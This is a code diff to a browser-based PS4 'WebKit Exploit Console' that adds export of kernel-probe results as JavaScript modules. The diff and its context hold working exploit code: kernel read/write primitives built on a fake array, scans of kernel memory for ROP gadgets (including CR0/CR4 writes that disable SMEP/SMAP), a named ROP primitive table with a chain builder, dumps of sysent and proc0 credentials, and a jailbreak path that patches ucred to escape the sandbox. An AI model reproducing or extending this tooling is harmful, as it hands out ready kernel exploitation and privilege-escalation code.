@@ -103,6 +103,7 @@
   button:hover { background: #253044; border-color: #35425c; }
   button:active { transform: translateY(1px); }
   button.primary { border-color: #1f4a7a; color: var(--accent); }
+  button.mjs { border-color: #4a2f7a; color: #b98fff; }
   #toolbar label { color: var(--dim); font-size: 11px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
   #toolbar .spacer { flex: 1 1 auto; }
   #toolbar .meta { color: var(--dim); font-size: 11px; }
@@ -179,10 +180,12 @@
 
 <div id="toolbar">
   <button id="btnDownload" class="primary">⬇ Download log (.txt)</button>
+  <button id="btnSaveMjs" class="mjs">⬇ Save probe (.mjs)</button>
   <button id="btnCopy">Copy log</button>
   <button id="btnClear">Clear</button>
   <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
-  <label><input type="checkbox" id="chkAutoSave"> auto-save .txt on finish</label>
+  <label><input type="checkbox" id="chkAutoSave"> auto-save .txt</label>
+  <label><input type="checkbox" id="chkAutoMjs" checked> auto-save .mjs on probe</label>
   <span class="spacer"></span>
   <span class="meta" id="toolbarMeta">rev —</span>
 </div>
@@ -208,6 +211,7 @@ var LOG = {
     maxLines: 8000,
     autoScroll: true,
     autoSave: false,
+    autoMjs: true,
     status: "pending",
     statusText: "INITIALIZING…",
     statusSub: "waiting for boot"
@@ -362,20 +366,31 @@ function buildLogText() {
     return L.join("\r\n");
 }
 
-function downloadLog() {
+function downloadText(filename, text, mime) {
     try {
-        var text = buildLogText();
-        var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+        var blob = new Blob([text], { type: mime || "text/plain;charset=utf-8" });
         var url = URL.createObjectURL(blob);
         var a = document.createElement("a");
-        var stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
         a.href = url;
-        a.download = "ps4-probe-log-" + stamp + ".txt";
+        a.download = filename;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
         setTimeout(function () { try { URL.revokeObjectURL(url); } catch (_) {} }, 10000);
-        logLine("LOG-SAVED file=ps4-probe-log-" + stamp + ".txt bytes=" + text.length, "info");
+        return true;
+    } catch (err) {
+        logLine("SAVE-FAILED " + filename + " " + err, "warn");
+        return false;
+    }
+}
+
+function downloadLog() {
+    try {
+        var text = buildLogText();
+        var stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+        if (downloadText("ps4-probe-log-" + stamp + ".txt", text)) {
+            logLine("LOG-SAVED file=ps4-probe-log-" + stamp + ".txt bytes=" + text.length, "info");
+        }
     } catch (err) {
         logLine("LOG-SAVE-FAILED " + err, "warn");
     }
@@ -426,20 +441,6 @@ function clearLog() {
     updateChips();
 }
 
-(function initUI() {
-    try {
-        document.getElementById("btnDownload").addEventListener("click", downloadLog);
-        document.getElementById("btnCopy").addEventListener("click", copyLog);
-        document.getElementById("btnClear").addEventListener("click", clearLog);
-        document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
-            LOG.autoScroll = !!ev.target.checked;
-        });
-        document.getElementById("chkAutoSave").addEventListener("change", function (ev) {
-            LOG.autoSave = !!ev.target.checked;
-        });
-    } catch (_) {}
-})();
-
 /* ============================================================
  *  EXPLOIT (single-shot, no auto-retry)
  * ============================================================ */
@@ -458,6 +459,7 @@ function printHeader() {
     logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
     logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
     logLine(" Mode: post-R/W kernel probe (gadget/ROP/symbol enumeration)", "info");
+    logLine(" Output: .mjs modules (kernel-info / gadgets / rop / index)", "info");
     logLine(headerBorder, "info");
 }
 
@@ -500,10 +502,6 @@ var requestedDrain = parseInt(Q.get("n") || "128", 10);
 var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 var LITE = Q.get("l") === "1";
 
-/* Post-R/W behaviour:
- *   default  → PROBE kernel (dump structs + scan for gadgets/ROP)
- *   ?jb=1    → run legacy kernel jailbreak instead
- */
 var RUN_JAILBREAK = Q.get("jb") === "1";
 
 var REVISION = "genuine-u8-rw-3-1352-probe";
@@ -971,11 +969,6 @@ function reportComposition() {
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
 
-        /* ------------------------------------------------------
-         *  POST-R/W GATE — we do NOT jailbreak by default.
-         *  Default: probe kernel (dump structs + scan gadgets/ROP).
-         *  Opt-in:  ?jb=1 runs the legacy kernel jailbreak path.
-         * ------------------------------------------------------ */
         if (!testRun) {
             testRun = true;
             if (RUN_JAILBREAK) {
@@ -1118,9 +1111,8 @@ function write64(addr, value) {
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
 }
 
-/* Bulk byte reader built on the same primitive.
- * Points the fake array's backing vector at `addr` and pulls `count` bytes
- * out in 8-byte strides. Restores the original vector when finished. */
+/* Bulk byte reader — points the fake array vector at `addr` and pulls
+ * `count` bytes out in 8-byte strides. Restores the original vector. */
 function readBytes(addr, count) {
     var out = new Uint8Array(count);
     if (!globalFakeArray) return out;
@@ -1145,10 +1137,7 @@ function readBytes(addr, count) {
 }
 
 // ========== GADGET / ROP PATTERN TABLE ==========
-/* Each entry: { name, bytes[] }. Scanning finds the first hit per gadget
- * in each window; that is enough to build a working ROP chain later. */
 var GADGETS = [
-    // pop reg ; ret
     { name: "pop rdi ; ret",              bytes: [0x5F, 0xC3] },
     { name: "pop rsi ; ret",              bytes: [0x5E, 0xC3] },
     { name: "pop rdx ; ret",              bytes: [0x5A, 0xC3] },
@@ -1165,29 +1154,24 @@ var GADGETS = [
     { name: "pop r13 ; ret",              bytes: [0x41, 0x5D, 0xC3] },
     { name: "pop r14 ; ret",              bytes: [0x41, 0x5E, 0xC3] },
     { name: "pop r15 ; ret",              bytes: [0x41, 0x5F, 0xC3] },
-    // stack / frame
     { name: "leave ; ret",                bytes: [0xC9, 0xC3] },
     { name: "pop rsp ; pop rbp ; ret",    bytes: [0x5C, 0x5D, 0xC3] },
     { name: "add rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x28, 0xC3] },
     { name: "add rsp, 0x38 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x38, 0xC3] },
     { name: "sub rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xEC, 0x28, 0xC3] },
-    // privilege / transitions
     { name: "swapgs ; ret",               bytes: [0x0F, 0x01, 0xF8, 0xC3] },
     { name: "swapgs ; iretq",             bytes: [0x0F, 0x01, 0xF8, 0x48, 0xCF] },
     { name: "iretq",                      bytes: [0x48, 0xCF] },
     { name: "sysretq",                    bytes: [0x48, 0x0F, 0x07] },
     { name: "sysret",                     bytes: [0x0F, 0x07] },
-    // register moves / pivots
     { name: "mov rdi, rax ; ...",         bytes: [0x48, 0x89, 0xC7] },
     { name: "mov rdi, rsp ; ...",         bytes: [0x48, 0x89, 0xE7] },
     { name: "xchg rax, rsp ; ret",        bytes: [0x48, 0x94, 0xC3] },
     { name: "xchg edi, eax",              bytes: [0x97] },
-    // CR writes (bypass SMEP/SMAP/CR0.WP)
     { name: "mov cr4, rdi ; ret",         bytes: [0x0F, 0x22, 0xE7, 0xC3] },
     { name: "mov cr4, rax",               bytes: [0x0F, 0x22, 0xE0] },
     { name: "mov cr0, rdi",               bytes: [0x0F, 0x22, 0xC7] },
     { name: "mov cr3, rdi",               bytes: [0x0F, 0x22, 0xDF] },
-    // misc
     { name: "ret",                        bytes: [0xC3] },
     { name: "nop ; ret",                  bytes: [0x90, 0xC3] },
     { name: "cli ; ret",                  bytes: [0xFA, 0xC3] },
@@ -1200,7 +1184,6 @@ var GADGETS = [
     { name: "sysenter",                   bytes: [0x0F, 0x34] },
     { name: "int 0x80",                   bytes: [0xCD, 0x80] },
     { name: "int3 ; ret",                 bytes: [0xCC, 0xC3] },
-    // indirect jmps / calls — the sy_call hijack gadget falls in here
     { name: "jmp rax",                    bytes: [0xFF, 0xE0] },
     { name: "jmp rcx",                    bytes: [0xFF, 0xE1] },
     { name: "jmp rdx",                    bytes: [0xFF, 0xE2] },
@@ -1210,6 +1193,45 @@ var GADGETS = [
     { name: "call rsi",                   bytes: [0xFF, 0xD6] },
     { name: "call rdi",                   bytes: [0xFF, 0xD7] }
 ];
+
+/* ============================================================
+ *  PROBE ACCUMULATOR + .MJS EXPORT
+ * ============================================================ */
+var PROBE = {
+    fw: "",
+    revision: REVISION,
+    started: 0,
+    finished: 0,
+    kbase: 0n,
+    kbaseHeader: null,
+    offsets: {},         // { evf, prison0, rootvnode, sysent, jmp } — Numbers
+    addrs: {},           // resolved absolute addresses — BigInt
+    structs: {           // live runtime values
+        evfValue: null,
+        prison0Value: null,
+        rootvnodeValue: null,
+        sysent661: null, // { addr, narg, call, thrcnt }
+        proc0: null      // { addr, pid, ucred, uid, gid, prison }
+    },
+    sysentDump: [],      // array of hex-row strings
+    windowHits: {},      // { label: [ { name, addr } ] }
+    errors: []
+};
+
+function bigHex(v) {
+    try {
+        if (typeof v === "bigint") return "0x" + v.toString(16) + "n";
+        if (typeof v === "number" && isFinite(v)) return "0x" + Math.floor(v).toString(16) + "n";
+    } catch (_) {}
+    return "null";
+}
+function numHex(v) {
+    try { return "0x" + Number(v).toString(16); } catch (_) { return "0x0"; }
+}
+function bigHexOrNull(v) {
+    if (v === null || v === undefined) return "null";
+    return bigHex(v);
+}
 
 function scanGadgetsInWindow(startAddr, windowBytes) {
     var hits = [];
@@ -1225,12 +1247,13 @@ function scanGadgetsInWindow(startAddr, windowBytes) {
                 }
                 if (ok) {
                     hits.push({ name: gd.name, addr: BigInt(startAddr) + BigInt(i) });
-                    break; // first hit per pattern is enough
+                    break;
                 }
             }
         }
     } catch (err) {
         mark("SCAN-ERROR", hex(startAddr) + ":" + (err && err.message ? err.message.slice(0, 60) : "?"));
+        PROBE.errors.push("SCAN-ERROR " + hex(startAddr));
     }
     return hits;
 }
@@ -1238,6 +1261,7 @@ function scanGadgetsInWindow(startAddr, windowBytes) {
 function dumpWindow(label, startAddr, windowBytes) {
     mark(label + "-START", hex(startAddr) + "-len=0x" + windowBytes.toString(16));
     var hits = scanGadgetsInWindow(startAddr, windowBytes);
+    PROBE.windowHits[label] = hits;
     if (hits.length === 0) {
         mark(label + "-NONE", "no patterns matched");
         return hits;
@@ -1248,21 +1272,297 @@ function dumpWindow(label, startAddr, windowBytes) {
     return hits;
 }
 
+/* -------- .mjs content builders -------- */
+
+function buildKernelInfoMjs() {
+    var L = [];
+    L.push("// PS4 Kernel Info — auto-generated by WebKit Exploit Console");
+    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
+    L.push("// Revision   : " + PROBE.revision);
+    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
+    L.push("");
+    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
+    L.push("export const REVISION = " + JSON.stringify(PROBE.revision) + ";");
+    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
+    L.push("");
+    L.push("// Firmware offset table (relative to KERNEL_BASE)");
+    L.push("export const OFFSETS = {");
+    var offKeys = ["evf", "prison0", "rootvnode", "sysent", "jmp"];
+    for (var i = 0; i < offKeys.length; i++) {
+        var k = offKeys[i];
+        L.push("    " + k + ": " + numHex(PROBE.offsets[k] || 0) + ",");
+    }
+    L.push("};");
+    L.push("");
+    L.push("// Absolute kernel addresses");
+    L.push("export const ADDRESSES = {");
+    for (var j = 0; j < offKeys.length; j++) {
+        var kk = offKeys[j];
+        if (PROBE.addrs[kk] !== undefined) L.push("    " + kk + ": " + bigHex(PROBE.addrs[kk]) + ",");
+    }
+    L.push("};");
+    L.push("");
+    L.push("// Live values read from kernel memory");
+    L.push("export const RUNTIME = {");
+    L.push("    proc0:      " + bigHexOrNull(PROBE.structs.evfValue) + ",");
+    L.push("    prison0:    " + bigHexOrNull(PROBE.structs.prison0Value) + ",");
+    L.push("    rootvnode:  " + bigHexOrNull(PROBE.structs.rootvnodeValue) + ",");
+    L.push("};");
+    L.push("");
+    if (PROBE.structs.sysent661) {
+        var s = PROBE.structs.sysent661;
+        L.push("export const SYSENT_661 = {");
+        L.push("    addr:   " + bigHex(s.addr) + ",");
+        L.push("    narg:   " + bigHex(s.narg) + ",");
+        L.push("    call:   " + bigHex(s.call) + ",");
+        L.push("    thrcnt: " + bigHex(s.thrcnt) + ",");
+        L.push("};");
+        L.push("");
+    }
+    if (PROBE.structs.proc0) {
+        var p = PROBE.structs.proc0;
+        L.push("export const PROC0 = {");
+        L.push("    addr:   " + bigHex(p.addr) + ",");
+        if (p.pid    !== null) L.push("    pid:    " + bigHex(p.pid) + ",");
+        if (p.ucred  !== null) L.push("    ucred:  " + bigHex(p.ucred) + ",");
+        if (p.uid    !== null) L.push("    uid:    " + bigHex(p.uid) + ",");
+        if (p.gid    !== null) L.push("    gid:    " + bigHex(p.gid) + ",");
+        if (p.prison !== null) L.push("    prison: " + bigHex(p.prison) + ",");
+        L.push("};");
+        L.push("");
+    }
+    if (PROBE.kbaseHeader) {
+        L.push("export const KBASE_HEADER = {");
+        L.push("    q0: " + bigHex(PROBE.kbaseHeader[0]) + ",");
+        L.push("    q1: " + bigHex(PROBE.kbaseHeader[1]) + ",");
+        L.push("    q2: " + bigHex(PROBE.kbaseHeader[2]) + ",");
+        L.push("    q3: " + bigHex(PROBE.kbaseHeader[3]) + ",");
+        L.push("};");
+        L.push("");
+    }
+    if (PROBE.sysentDump.length) {
+        L.push("export const SYSENT_DUMP = [");
+        for (var d = 0; d < PROBE.sysentDump.length; d++) {
+            L.push("    " + JSON.stringify(PROBE.sysentDump[d]) + ",");
+        }
+        L.push("].join(\"\\n\");");
+        L.push("");
+    }
+    L.push("// Full firmware offset table (all known firmwares)");
+    L.push("export const FULL_OFFSET_TABLE = {");
+    for (var fw in PS4_OFFSETS) {
+        var row = PS4_OFFSETS[fw];
+        L.push("    " + JSON.stringify(fw) + ": { evf: " + numHex(row.evf) + ", prison0: " + numHex(row.prison0) +
+               ", rootvnode: " + numHex(row.rootvnode) + ", sysent: " + numHex(row.sysent) + ", jmp: " + numHex(row.jmp) + " },");
+    }
+    L.push("};");
+    L.push("");
+    L.push("export default { FIRMWARE, KERNEL_BASE, OFFSETS, ADDRESSES, RUNTIME };");
+    return L.join("\n");
+}
+
+function buildGadgetsMjs() {
+    var L = [];
+    L.push("// PS4 Gadgets — auto-generated by WebKit Exploit Console");
+    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
+    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
+    L.push("");
+    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
+    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
+    L.push("");
+    L.push("// Hits grouped by scan window");
+    L.push("export const WINDOWS = {");
+    for (var label in PROBE.windowHits) {
+        L.push("    " + JSON.stringify(label) + ": [");
+        var arr = PROBE.windowHits[label];
+        for (var i = 0; i < arr.length; i++) {
+            L.push("        { name: " + JSON.stringify(arr[i].name) + ", addr: " + bigHex(arr[i].addr) + " },");
+        }
+        L.push("    ],");
+    }
+    L.push("};");
+    L.push("");
+    L.push("// Flat lookup by name (first hit across all windows)");
+    L.push("export const GADGETS = {");
+    var flat = {};
+    for (var lb in PROBE.windowHits) {
+        var a = PROBE.windowHits[lb];
+        for (var k = 0; k < a.length; k++) {
+            if (!(a[k].name in flat)) flat[a[k].name] = a[k].addr;
+        }
+    }
+    for (var nm in flat) {
+        L.push("    " + JSON.stringify(nm) + ": " + bigHex(flat[nm]) + ",");
+    }
+    L.push("};");
+    L.push("");
+    L.push("export default { FIRMWARE, KERNEL_BASE, WINDOWS, GADGETS };");
+    return L.join("\n");
+}
+
+function buildRopMjs() {
+    var flat = {};
+    for (var lb in PROBE.windowHits) {
+        var a = PROBE.windowHits[lb];
+        for (var k = 0; k < a.length; k++) {
+            if (!(a[k].name in flat)) flat[a[k].name] = a[k].addr;
+        }
+    }
+    function pick(name) { return (name in flat) ? bigHex(flat[name]) : "null"; }
+
+    var L = [];
+    L.push("// PS4 ROP primitives — auto-generated by WebKit Exploit Console");
+    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
+    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
+    L.push("");
+    L.push("export const FIRMWARE = " + JSON.stringify(PROBE.fw || "") + ";");
+    L.push("export const KERNEL_BASE = " + bigHex(PROBE.kbase) + ";");
+    L.push("");
+    L.push("// Ready-named ROP primitives (null if not located on this FW)");
+    L.push("export const ROP = {");
+    L.push("    popRdi:      " + pick("pop rdi ; ret") + ",");
+    L.push("    popRsi:      " + pick("pop rsi ; ret") + ",");
+    L.push("    popRdx:      " + pick("pop rdx ; ret") + ",");
+    L.push("    popRcx:      " + pick("pop rcx ; ret") + ",");
+    L.push("    popRax:      " + pick("pop rax ; ret") + ",");
+    L.push("    popRbx:      " + pick("pop rbx ; ret") + ",");
+    L.push("    popRsp:      " + pick("pop rsp ; ret") + ",");
+    L.push("    popRbp:      " + pick("pop rbp ; ret") + ",");
+    L.push("    popR8:       " + pick("pop r8  ; ret") + ",");
+    L.push("    popR9:       " + pick("pop r9  ; ret") + ",");
+    L.push("    popR10:      " + pick("pop r10 ; ret") + ",");
+    L.push("    popR11:      " + pick("pop r11 ; ret") + ",");
+    L.push("    popR12:      " + pick("pop r12 ; ret") + ",");
+    L.push("    popR13:      " + pick("pop r13 ; ret") + ",");
+    L.push("    popR14:      " + pick("pop r14 ; ret") + ",");
+    L.push("    popR15:      " + pick("pop r15 ; ret") + ",");
+    L.push("    leaveRet:    " + pick("leave ; ret") + ",");
+    L.push("    ret:         " + pick("ret") + ",");
+    L.push("    nopRet:      " + pick("nop ; ret") + ",");
+    L.push("    swapgsRet:   " + pick("swapgs ; ret") + ",");
+    L.push("    swapgsIretq: " + pick("swapgs ; iretq") + ",");
+    L.push("    iretq:       " + pick("iretq") + ",");
+    L.push("    sysretq:     " + pick("sysretq") + ",");
+    L.push("    movCr4Rdi:   " + pick("mov cr4, rdi ; ret") + ",");
+    L.push("    movCr4Rax:   " + pick("mov cr4, rax") + ",");
+    L.push("    movCr0Rdi:   " + pick("mov cr0, rdi") + ",");
+    L.push("    movCr3Rdi:   " + pick("mov cr3, rdi") + ",");
+    L.push("    xchgRaxRsp:  " + pick("xchg rax, rsp ; ret") + ",");
+    L.push("    addRsp28:    " + pick("add rsp, 0x28 ; ret") + ",");
+    L.push("    subRsp28:    " + pick("sub rsp, 0x28 ; ret") + ",");
+    L.push("    cliRet:      " + pick("cli ; ret") + ",");
+    L.push("    stiRet:      " + pick("sti ; ret") + ",");
+    L.push("    wrmsr:       " + pick("wrmsr") + ",");
+    L.push("    rdmsr:       " + pick("rdmsr") + ",");
+    L.push("    syscall:     " + pick("syscall") + ",");
+    L.push("    sysenter:    " + pick("sysenter") + ",");
+    L.push("    int80:       " + pick("int 0x80") + ",");
+    L.push("    jmpRax:      " + pick("jmp rax") + ",");
+    L.push("    jmpRcx:      " + pick("jmp rcx") + ",");
+    L.push("    jmpRdx:      " + pick("jmp rdx") + ",");
+    L.push("    jmpRsi:      " + pick("jmp rsi") + ",");
+    L.push("    jmpRdi:      " + pick("jmp rdi") + ",");
+    L.push("    callRax:     " + pick("call rax") + ",");
+    L.push("    callRsi:     " + pick("call rsi") + ",");
+    L.push("    callRdi:     " + pick("call rdi") + ",");
+    L.push("};");
+    L.push("");
+    L.push("// Build a ROP chain from an array of {gadget, args} steps.");
+    L.push("//   chain([");
+    L.push("//     { g: ROP.popRdi, a: [0xdeadbeefn] },");
+    L.push("//     { g: ROP.ret },");
+    L.push("//   ])");
+    L.push("export function chain(steps) {");
+    L.push("    const out = [];");
+    L.push("    for (const s of steps) {");
+    L.push("        if (s.g == null) throw new Error('missing gadget in step');");
+    L.push("        out.push(s.g);");
+    L.push("        if (s.a) for (const v of s.a) out.push(v);");
+    L.push("    }");
+    L.push("    return out;");
+    L.push("}");
+    L.push("");
+    L.push("export default { FIRMWARE, KERNEL_BASE, ROP, chain };");
+    return L.join("\n");
+}
+
+function buildIndexMjs(filenames) {
+    var L = [];
+    L.push("// PS4 Probe Manifest — auto-generated");
+    L.push("// Firmware   : " + (PROBE.fw || "(undetected)"));
+    L.push("// Generated  : " + new Date(PROBE.finished || Date.now()).toISOString());
+    L.push("//");
+    L.push("// Drop the four .mjs files in the same directory and import this one.");
+    L.push("");
+    L.push("export * from " + JSON.stringify(filenames.kernel) + ";");
+    L.push("export * from " + JSON.stringify(filenames.gadgets) + ";");
+    L.push("export * from " + JSON.stringify(filenames.rop) + ";");
+    L.push("");
+    return L.join("\n");
+}
+
+var mjsSavedOnce = false;
+function saveProbeMjs() {
+    if (!PROBE.finished) {
+        PROBE.finished = Date.now();
+    }
+    var fw = (PROBE.fw || "unknown").replace(/[^0-9a-zA-Z.]+/g, "_");
+    var stamp = new Date(PROBE.finished).toISOString().replace(/[:.]/g, "-").slice(0, 19);
+    var names = {
+        kernel:  "ps4-kernel-info-" + fw + "-" + stamp + ".mjs",
+        gadgets: "ps4-gadgets-" + fw + "-" + stamp + ".mjs",
+        rop:     "ps4-rop-" + fw + "-" + stamp + ".mjs",
+        index:   "ps4-probe-index-" + fw + "-" + stamp + ".mjs"
+    };
+
+    var kTxt = buildKernelInfoMjs();
+    var gTxt = buildGadgetsMjs();
+    var rTxt = buildRopMjs();
+    var iTxt = buildIndexMjs({ kernel: names.kernel, gadgets: names.gadgets, rop: names.rop });
+
+    // Browsers throttle simultaneous downloads — stagger them.
+    var queue = [
+        [names.kernel,  kTxt],
+        [names.gadgets, gTxt],
+        [names.rop,     rTxt],
+        [names.index,   iTxt]
+    ];
+    (function next(i) {
+        if (i >= queue.length) {
+            mark("MJS-SAVED", "files=" + queue.length + "-fw=" + (PROBE.fw || "?"));
+            return;
+        }
+        var item = queue[i];
+        if (downloadText(item[0], item[1], "text/javascript;charset=utf-8")) {
+            mark("MJS-FILE", item[0] + "-bytes=" + item[1].length);
+        }
+        setTimeout(function () { next(i + 1); }, 350);
+    })(0);
+
+    mjsSavedOnce = true;
+}
+
 // ========== KERNEL PROBE (default post-R/W action) ==========
 function runProbe() {
+    PROBE.started = Date.now();
+    PROBE.fw = FW_LABEL || "";
+    PROBE.revision = REVISION;
+    PROBE.windowHits = {};
+    PROBE.errors = [];
+
     mark("===== KERNEL PROBE START =====", "fw=" + FW_LABEL + " rev=" + REVISION);
 
     try {
-        // Fixed mapping on PS4; used as base for all offset-based reads.
         var kbase = 0xffffffff80000000n;
+        PROBE.kbase = kbase;
         mark("KBASE-ASSUMED", hex(kbase));
 
-        // Sanity-check the base — grab the first 32 bytes.
         try {
             var hdrA = read64(kbase);
             var hdrB = read64(kbase + 8n);
             var hdrC = read64(kbase + 16n);
             var hdrD = read64(kbase + 24n);
+            PROBE.kbaseHeader = [hdrA, hdrB, hdrC, hdrD];
             mark("KBASE-HDR", "q0=" + hex(hdrA) + " q1=" + hex(hdrB) + " q2=" + hex(hdrC) + " q3=" + hex(hdrD));
         } catch (_) {}
 
@@ -1272,37 +1572,52 @@ function runProbe() {
         var sysent    = fwOffsets.sysent;
         var jmp       = fwOffsets.jmp;
 
-        // -------- EVF / proc0 --------
+        PROBE.offsets = { evf: evf, prison0: prison0, rootvnode: rootvnode, sysent: sysent, jmp: jmp };
+
         var evfAddr = kbase + BigInt(evf);
-        var evfVal  = read64(evfAddr);
+        var prisonAddr = kbase + BigInt(prison0);
+        var rootAddr   = kbase + BigInt(rootvnode);
+        var sysentAddr = kbase + BigInt(sysent);
+        var jmpAddr    = kbase + BigInt(jmp);
+
+        PROBE.addrs = {
+            evf: evfAddr,
+            prison0: prisonAddr,
+            rootvnode: rootAddr,
+            sysent661: sysentAddr,
+            jmpRsi: jmpAddr
+        };
+
+        // -------- EVF / proc0 --------
+        var evfVal = read64(evfAddr);
+        PROBE.structs.evfValue = evfVal;
         mark("EVF", "addr=" + hex(evfAddr) + "-proc0=" + hex(evfVal));
 
         // -------- prison0 --------
-        var prisonAddr = kbase + BigInt(prison0);
-        var prisonVal  = read64(prisonAddr);
+        var prisonVal = read64(prisonAddr);
+        PROBE.structs.prison0Value = prisonVal;
         mark("PRISON0", "addr=" + hex(prisonAddr) + "-value=" + hex(prisonVal));
 
         // -------- rootvnode --------
-        var rootAddr = kbase + BigInt(rootvnode);
-        var rootVal  = read64(rootAddr);
+        var rootVal = read64(rootAddr);
+        PROBE.structs.rootvnodeValue = rootVal;
         mark("ROOTVNODE", "addr=" + hex(rootAddr) + "-value=" + hex(rootVal));
 
-        // -------- sysent[661] (getpid-style hijack slot) --------
-        var sysentAddr = kbase + BigInt(sysent);
-        var sy_narg    = read64(sysentAddr);
-        var sy_call    = read64(sysentAddr + 8n);
-        var sy_thrcnt  = read64(sysentAddr + 0x2Cn);
+        // -------- sysent[661] --------
+        var sy_narg   = read64(sysentAddr);
+        var sy_call   = read64(sysentAddr + 8n);
+        var sy_thrcnt = read64(sysentAddr + 0x2Cn);
+        PROBE.structs.sysent661 = { addr: sysentAddr, narg: sy_narg, call: sy_call, thrcnt: sy_thrcnt };
         mark("SYSENT-661", "addr=" + hex(sysentAddr));
         mark("SYSENT-661-NARG", hex(sy_narg));
         mark("SYSENT-661-CALL", hex(sy_call));
         mark("SYSENT-661-THRCNT", hex(sy_thrcnt));
 
-        // -------- the exact jmp-gadget used by the classic jailbreak --------
-        var jmpAddr  = kbase + BigInt(jmp);
+        // -------- known jmp gadget --------
         var jmpBytes = read64(jmpAddr);
         mark("JMP-RSI-KNOWN", "addr=" + hex(jmpAddr) + "-bytes=" + hex(jmpBytes));
 
-        // -------- Dump first 256 bytes of sysent --------
+        // -------- sysent hex dump --------
         var dump = [];
         for (var off = 0; off < 0x100; off += 0x20) {
             var row = "+" + ("000" + off.toString(16)).slice(-3) + ":";
@@ -1314,42 +1629,45 @@ function runProbe() {
             }
             dump.push(row);
         }
+        PROBE.sysentDump = dump.slice();
         mark("SYSENT-DUMP", dump.join("\n"));
 
-        // -------- Follow proc0 pointer chain --------
+        // -------- proc0 chain --------
         if (evfVal > 0xffff000000000000n && evfVal < 0xffffffffffffffffn) {
+            PROBE.structs.proc0 = { addr: evfVal, pid: null, ucred: null, uid: null, gid: null, prison: null };
             try {
                 var pid   = read64(evfVal + 0xBCn);
                 var ucred = read64(evfVal + 0x40n);
+                PROBE.structs.proc0.pid = pid;
+                PROBE.structs.proc0.ucred = ucred;
                 mark("PROC0-PID",   hex(pid));
                 mark("PROC0-UCRED", hex(ucred));
                 if (ucred > 0xffff000000000000n && ucred < 0xffffffffffffffffn) {
                     var uid    = read64(ucred + 0x04n);
                     var gid    = read64(ucred + 0x08n);
                     var prison = read64(ucred + 0x30n);
+                    PROBE.structs.proc0.uid = uid;
+                    PROBE.structs.proc0.gid = gid;
+                    PROBE.structs.proc0.prison = prison;
                     mark("PROC0-UCRED-VALUES", "uid=" + hex(uid) + "-gid=" + hex(gid) + "-prison=" + hex(prison));
                 }
             } catch (e) {
                 mark("PROC0-CHAIN-ERR", String(e && e.message).slice(0, 60));
+                PROBE.errors.push("PROC0-CHAIN " + (e && e.message));
             }
         }
 
-        // -------- Gadget / ROP scans --------
-        // Window 1: around the sy_call pointer (real kernel function body)
+        // -------- gadget scans --------
         var w1Base = (sy_call & ~0xFFFn) - 0x800n;
         if (w1Base < kbase) w1Base = kbase;
         dumpWindow("SCAN-SYCALL", w1Base, 0x1000);
 
-        // Window 2: early kernel text
         dumpWindow("SCAN-EARLY", kbase + 0x1000n, 0x1000);
 
-        // Window 3: tight window around the known jmp gadget
         dumpWindow("SCAN-JMP", (jmpAddr & ~0xFFn), 0x400);
 
-        // Window 4: around rootvnode table
         dumpWindow("SCAN-ROOT", (rootAddr & ~0xFFFn), 0x800);
 
-        // -------- Report the ROP-relevant findings in a summary --------
         mark("ROP-SUMMARY",
             "kb=" + hex(kbase) +
             "-sysent=" + hex(sysentAddr) +
@@ -1357,12 +1675,23 @@ function runProbe() {
             "-prison0=" + hex(prisonVal) +
             "-rootvnode=" + hex(rootVal));
 
+        PROBE.finished = Date.now();
         mark("===== KERNEL PROBE COMPLETE =====", "fw=" + FW_LABEL);
         setStatus("halted", "R/W PROBE COMPLETE", "gadgets + kernel info in console");
         maybeAutoSave();
 
+        // Emit .mjs modules.
+        if (LOG.autoMjs && !mjsSavedOnce) {
+            setTimeout(saveProbeMjs, 300);
+        }
+
     } catch (err) {
+        PROBE.finished = Date.now();
+        PROBE.errors.push("PROBE-ERROR " + (err && err.message));
         mark("PROBE-ERROR", (err && err.name) + ":" + String(err && err.message).slice(0, 120));
+        if (LOG.autoMjs && !mjsSavedOnce) {
+            setTimeout(saveProbeMjs, 300);
+        }
     }
 }
 
@@ -1438,7 +1767,6 @@ function runJailbreak() {
         if (!sandboxEscaped) {
             var sigStart = proc - 0x4000n;
             var sigEnd = proc + 0x4000n;
-            var sigFound = 0n;
             for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
                 try {
                     var ref = Number(read64(s) & 0xFFFFFFFFn);
@@ -1450,7 +1778,6 @@ function runJailbreak() {
                     if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
                     if (patchAndVerifyUcred(s, prisonVal)) {
                         sandboxEscaped = true;
-                        sigFound = s;
                         mark("UCRED-SIG-FOUND", hex(s));
                         mark("SANDBOX-ESCAPE", "success");
                         mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
@@ -1514,9 +1841,31 @@ function runAttempt() {
     }
 }
 
+// ========== UI WIRING ==========
+(function initUI() {
+    try {
